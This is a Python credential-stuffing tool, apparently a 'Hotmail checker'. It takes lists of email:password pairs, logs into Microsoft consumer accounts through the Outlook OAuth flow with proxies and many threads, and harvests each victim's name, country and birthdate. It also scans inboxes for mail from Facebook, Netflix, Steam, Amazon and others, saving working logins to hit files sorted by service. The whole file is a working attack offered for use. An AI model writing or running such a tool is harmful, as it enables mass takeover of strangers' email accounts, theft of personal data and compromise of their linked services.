import os, sys, io, time, json, uuid, pycountry
import datetime, requests, threading, concurrent.futures
from colorama import Fore, Style, init
import random
import re
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
from threading import Lock, Semaphore
init(autoreset=True)

# Color definitions
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE

# Colours
HEADER = Fore.CYAN
HITS_COLOR = Fore.LIGHTGREEN_EX
BAD_COLOR = Fore.LIGHTRED_EX
RETRY_COLOR = Fore.LIGHTYELLOW_EX
TFA_COLOR = Fore.MAGENTA
WHITE = Fore.WHITE
INFO = Fore.CYAN
SUCCESS = Fore.GREEN
ERROR = Fore.RED
WARNING = Fore.YELLOW
MAGENTA = Fore.MAGENTA

class HotmailChecker:
    def __init__(self, log_callback=None, proxies=None):
        self.lock = threading.Lock()
        self.hit = 0
        self.bad = 0
        self.retry = 0
        self.total_combos = 0
        self.processed = 0
        self.linked_accounts = {}
        self.checked_accounts = set()
        self.rate_limit_semaphore = Semaphore(100)
        self.log_callback = log_callback
        self.last_log_time = 0
        self.proxies = proxies if proxies else []
        self.session = requests.Session()

    def get_flag(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
        except LookupError:
            return '🏳'

    def update_progress(self):
        """Update the progress display with current statistics"""
        with self.lock:
            progress_percent = min((self.processed / self.total_combos * 100), 100) if self.total_combos > 0 else 0
            linked_total = sum(self.linked_accounts.values())

            stats_text = (f"Progress: {self.processed}/{self.total_combos} ({progress_percent:.1f}%) | "
                          f"Hits: {linked_total} | Bad: {self.bad} | Retries: {self.retry}")

            sys.stdout.write(f"\r{WHITE}{stats_text} ")
            sys.stdout.flush()

            if self.log_callback and (time.time() - self.last_log_time > 5):
                self.log_callback(stats_text)
                self.last_log_time = time.time()

    def save_account_by_type(self, service_name, email, password):
        if service_name in services:
            if not os.path.exists("Accounts"): os.makedirs("Accounts")
            filename = os.path.join("Accounts", services[service_name]["file"])
            account_line = f"{email}:{password}\n"
            with open(filename, 'a', encoding='utf-8') as f: f.write(account_line)
            with self.lock:
                if service_name in self.linked_accounts: self.linked_accounts[service_name] += 1
                else: self.linked_accounts[service_name] = 1

    def get_capture(self, email, password, token, cid, proxy_dict):
        try:
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
            }
            response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=30, proxies=proxy_dict).json()
            name = response.get('names', [{}])[0].get('displayName', 'Unknown')
            country = response.get('accounts', [{}])[0].get('location', 'Unknown')
            flag = self.get_flag(country)

            try:
                birthdate = "{:04d}-{:02d}-{:02d}".format(
                    response["accounts"][0]["birthYear"],
                    response["accounts"][0]["birthMonth"],
                    response["accounts"][0]["birthDay"]
                )
            except: birthdate = "Unknown"

            url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
            headers_owa = {
                "Host": "outlook.live.com",
                "x-owa-sessionid": f"{cid}",
                "authorization": f"Bearer {token}",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
            }
            inbox_response = requests.post(url, headers=headers_owa, data="", timeout=30, proxies=proxy_dict).text

            linked_services = []
            for service_name, service_info in services.items():
                sender = service_info["sender"]
                if sender in inbox_response:
                    count = inbox_response.count(sender)
                    linked_services.append(f"[✔] {service_name} ({count})")
                    self.save_account_by_type(service_name, email, password)

            linked_services_str = "\n".join(linked_services) if linked_services else "[×] No linked services found."
            capture = f"Email: {email}\nPass: {password}\nName: {name}\nCountry: {flag} {country}\nBirth: {birthdate}\nServices:\n{linked_services_str}\n"
            with open('Hotmail-Hits.txt', 'a', encoding='utf-8') as f: f.write(capture + "-"*20 + "\n")
            with self.lock: self.hit += 1
        except: pass
        finally:
            with self.lock: self.processed += 1
            self.update_progress()

    def check_account(self, email, password):
        proxy_dict = None
        if self.proxies:
             p = random.choice(self.proxies)
             proxy_dict = {'http': p, 'https': p}

        try:
            session = requests.Session()
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15, proxies=proxy_dict)
            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
                return {"status": "BAD"}

            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0"}, timeout=15, proxies=proxy_dict)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match: return {"status": "BAD"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            login_data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={ppft}"
            r3 = session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=False, timeout=15, proxies=proxy_dict)

            if any(x in r3.text for x in ["incorrect", "error"]): return {"status": "BAD"}
            location = r3.headers.get("Location", "")
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match: return {"status": "BAD"}

            code = code_match.group(1)
            token_data = {"client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "grant_type": "authorization_code", "code": code}
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15, proxies=proxy_dict)
            access_token = r4.json().get("access_token")
            if not access_token: return {"status": "BAD"}

            cid = session.cookies.get("MSPCID", "").upper() or str(uuid.uuid4()).upper()
            self.get_capture(email, password, access_token, cid, proxy_dict)
            return {"status": "HIT"}
        except: return {"status": "RETRY"}

    def check_combo(self, email, password):
        with self.rate_limit_semaphore:
            result = self.check_account(email, password)
            if result["status"] != "HIT":
                with self.lock:
                    if result["status"] == "BAD": self.bad += 1
                    else: self.retry += 1
                    self.processed += 1
                self.update_progress()

    def run(self, file_path, num_threads=50):
        try:
            with open(file_path, "r", encoding="utf-8", errors='ignore') as f:
                lines = [line.strip() for line in f if ":" in line]
            self.total_combos = len(lines)
        except: return
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(self.check_combo, *line.split(":", 1)) for line in lines]
            concurrent.futures.wait(futures)
        if self.log_callback: self.log_callback(f"Finished! Hits: {self.hit}, Bad: {self.bad}, Retry: {self.retry}")

services = {
    "Facebook": {"sender": "security@facebookmail.com", "file": "facebook.txt"},
    "Instagram": {"sender": "security@mail.instagram.com", "file": "instagram.txt"},
    "TikTok": {"sender": "register@account.tiktok.com", "file": "tiktok.txt"},
    "Twitter": {"sender": "info@x.com", "file": "twitter.txt"},
    "Netflix": {"sender": "info@account.netflix.com", "file": "netflix.txt"},
    "Spotify": {"sender": "no-reply@spotify.com", "file": "spotify.txt"},
    "Amazon": {"sender": "auto-confirm@amazon.com", "file": "amazon.txt"},
    "Steam": {"sender": "noreply@steampowered.com", "file": "steam.txt"},
    "Xbox": {"sender": "xboxreps@engage.xbox.com", "file": "xbox.txt"},
    "PlayStation": {"sender": "sony@txn-email.playstation.com", "file": "psn.txt"},
}

def main():
    checker = HotmailChecker()
    checker.run(input("File: "))

if __name__ == "__main__":
    main()
